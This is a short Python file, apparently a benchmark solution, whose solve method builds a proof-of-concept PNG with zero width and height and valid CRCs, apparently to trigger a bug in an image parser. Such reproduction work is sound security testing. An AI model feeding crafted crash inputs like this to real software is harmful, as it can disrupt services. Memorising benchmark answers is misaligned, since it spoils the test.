import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        signature = b'\x89PNG\x0d\x0a\x1a\x0a'
        ihdr_len = b'\x00\x00\x00\x0d'
        ihdr_type = b'IHDR'
        ihdr_data = b'\x00\x00\x00\x00\x00\x00\x00\x00\x08\x02\x00\x00\x00'
        ihdr_crc = zlib.crc32(ihdr_type + ihdr_data).to_bytes(4, 'big')
        iend_len = b'\x00\x00\x00\x00'
        iend_type = b'IEND'
        iend_crc = zlib.crc32(iend_type).to_bytes(4, 'big')
        poc = signature + ihdr_len + ihdr_type + ihdr_data + ihdr_crc + iend_len + iend_type + iend_crc
        return poc